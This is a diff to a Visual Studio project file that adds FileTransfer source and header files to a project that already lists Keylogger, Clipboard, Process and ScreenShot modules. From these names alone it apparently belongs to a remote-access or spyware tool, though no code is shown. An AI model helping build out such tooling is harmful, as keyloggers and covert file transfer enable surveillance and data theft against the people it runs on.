@@ -126,6 +126,7 @@
   <ItemGroup>
     <ClCompile Include="Application.cpp" />
     <ClCompile Include="Clipboard.cpp" />
+    <ClCompile Include="FileTransfer.cpp" />
     <ClCompile Include="Keylogger.cpp" />
     <ClCompile Include="main.cpp" />
     <ClCompile Include="Process.cpp" />
@@ -138,6 +139,7 @@
   <ItemGroup>
     <ClInclude Include="Application.h" />
     <ClInclude Include="Clipboard.h" />
+    <ClInclude Include="FileTransfer.h" />
     <ClInclude Include="Keylogger.h" />
     <ClInclude Include="Process.h" />
     <ClInclude Include="ScreenShot.h" />
